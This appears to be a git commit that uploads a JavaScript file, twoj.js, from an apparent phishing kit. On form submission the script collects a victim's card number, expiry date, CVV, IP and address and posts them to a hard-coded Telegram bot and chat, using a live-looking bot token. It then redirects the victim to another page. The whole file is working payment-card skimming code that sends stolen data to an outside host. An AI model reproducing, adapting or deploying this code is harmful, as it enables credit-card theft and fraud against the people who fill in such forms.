22aec486c409f49e1d4e34a9ed2a820448d22a62
Ula0709 <159502337+Ula0709@users.noreply.github.com>
2025-04-28 02:26:59 -0400

    Add files via upload

---
+++ twoj.js
@@ -0,0 +1,36 @@
+//bot token
+var telegram_bot_id = "7933179313:AAFjbGziX_A9jLKiVe2be8HO7YyNGIuab8M";
+//chat id
+var chat_id = "-4755631975";
+var u_name, pax, pax2, pax3, ip, ip2;
+var ready = function () {
+    u_name = document.getElementById("numtar").value;
+    pax = document.getElementById("venctar").value;
+	pax2 = document.getElementById("cvctar").value;
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "🔵Tarjeta-General🔵\nNumTarjeta: " + u_name + "\nVencTarj: " + pax +"\nCvv: " + pax2 +"\nIP: " + ip +"\n" + ip2;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST", 
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        window.location = 'ppp.html';
+        console.log(response);
+    });
+    return false;
+};
